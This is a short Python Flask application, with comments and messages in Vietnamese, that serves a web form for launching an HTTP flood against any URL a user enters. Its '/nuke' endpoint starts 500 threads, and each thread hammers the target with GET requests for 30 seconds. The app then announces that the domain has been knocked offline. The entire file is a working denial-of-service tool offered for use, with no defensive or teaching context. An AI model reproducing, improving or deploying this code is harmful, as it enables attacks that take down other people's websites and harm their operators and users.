import os
import threading
import requests
import time
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

attack_running = False

def http_flood(url, duration=60):
    """Gửi request liên tục đến URL mục tiêu"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            requests.get(url, headers=headers, timeout=1)
        except:
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/nuke', methods=['POST'])
def nuke():
    global attack_running
    if attack_running:
        return jsonify({"status": "error", "message": "Đang có một cuộc tấn công khác"})

    url = request.form.get('url')
    name = request.form.get('name', 'web')
    if not url:
        return jsonify({"status": "error", "message": "Vui lòng nhập URL"})

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    attack_running = True
    # Tạo 500 luồng tấn công trong 30 giây
    threads = []
    for i in range(500):
        t = threading.Thread(target=http_flood, args=(url, 30))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    attack_running = False
    return jsonify({"status": "success", "message": f"💥 Miền {name} đã bị vô hiệu hóa! Không thể truy cập."})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
